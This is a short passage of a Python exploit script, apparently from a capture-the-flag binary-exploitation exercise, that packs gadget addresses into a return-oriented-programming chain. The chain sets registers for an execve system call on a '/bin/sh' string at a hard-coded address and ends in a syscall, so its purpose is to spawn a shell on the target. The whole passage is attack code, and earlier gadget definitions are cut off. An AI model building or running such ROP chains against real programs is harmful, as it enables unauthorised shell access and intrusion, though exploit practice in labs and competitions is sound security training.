...
execve_code = struct.pack("Q", 0x3b)
#rdi points to /bin/shh
bin_addr = struct.pack("Q", 0x400794)
#rsi points to rdi if /bin/shh is followed by 0
array_addr = struct.pack("Q", 0x0)
#rdx is 0
null_addr = struct.pack("Q", 0x0)

rop_chain = p_rax_addr + execve_code + p_rdi_addr + bin_addr + p_rsi_addr + array_addr + p_rdx_addr + null_addr + syscall
